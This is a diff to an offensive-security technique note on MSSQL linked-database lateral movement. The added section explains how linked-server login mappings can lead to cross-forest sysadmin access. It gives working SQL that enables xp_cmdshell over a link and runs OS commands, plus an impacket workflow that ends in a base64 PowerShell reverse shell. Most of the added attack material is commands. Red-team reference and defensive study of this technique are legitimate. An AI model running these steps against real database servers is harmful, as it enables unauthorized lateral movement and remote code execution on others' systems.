@@ -4,8 +4,8 @@ type: technique
 tags: [database, lateral-movement, mssql, reference-import, windows]
 phase: post-exploitation
 date_created: 2026-05-13
-date_updated: 2026-07-02
-sources: [InternalAllTheThings]
+date_updated: 2026-07-14
+sources: [InternalAllTheThings, hacktricks-network]
 ---
 
 # MSSQL - Linked Database
@@ -135,6 +135,38 @@ Get-SQLQuery -Instance "<DBSERVERNAME\DBInstance>" -Query "select * from openque
 
 ```ps1
 Get-SQLQuery -Instance "<DBSERVERNAME\DBInstance>" -Query "select * from openquery(`"<DatabaseLinkName>`"'select * from <DatabaseNameFromPreviousCommand>.dbo.<TableNameFromPreviousCommand> where <ColumnNameFromPreviousCommand>=<ColumnValueFromPreviousCommand>')" -Verbose
+```
+
+## MSSQL linked-server credential mapping to cross-forest sysadmin RCE
+
+Linked servers can be defined with a non-self login mapping (Local Login maps to a
+fixed Remote Login), so a low-priv login on the near server runs queries on the remote
+instance AS the mapped principal. This crosses domain and forest trust boundaries. If
+the mapped remote login is sysadmin, the link becomes a remote RCE primitive:
+reconfigure the far end and execute OS commands as its SQL service account. Enumerating
+the login mappings is the step beyond plain openquery.
+
+```sql
+-- Enumerate links and their login mappings (the key recon step)
+EXEC sp_linkedservers;
+EXEC sp_helplinkedsrvlogin '<LINK_NAME>';
+
+-- Who do you become on the far side, and is it sysadmin?
+EXEC ('SELECT SYSTEM_USER, IS_SRVROLEMEMBER(''sysadmin'')') AT [<LINK_NAME>];
+
+-- If sysadmin remotely: enable xp_cmdshell over the link and run commands
+EXEC ('sp_configure ''show advanced options'',1; RECONFIGURE;') AT [<LINK_NAME>];
+EXEC ('sp_configure ''xp_cmdshell'',1; RECONFIGURE;') AT [<LINK_NAME>];
+EXEC ('EXEC xp_cmdshell ''whoami''') AT [<LINK_NAME>];
+```
+
+```bash
+# Same workflow driven by impacket
+impacket-mssqlclient -windows-auth <DOMAIN>/<USER>:<PASS>@<SQLHOST>
+# SQL> enum_links
+# SQL> use_link [<LINK_NAME>]
+# SQL> enable_xp_cmdshell
+# SQL> xp_cmdshell powershell -e <BASE64_REVSHELL>
 ```
 
 ## Bypasses and variants
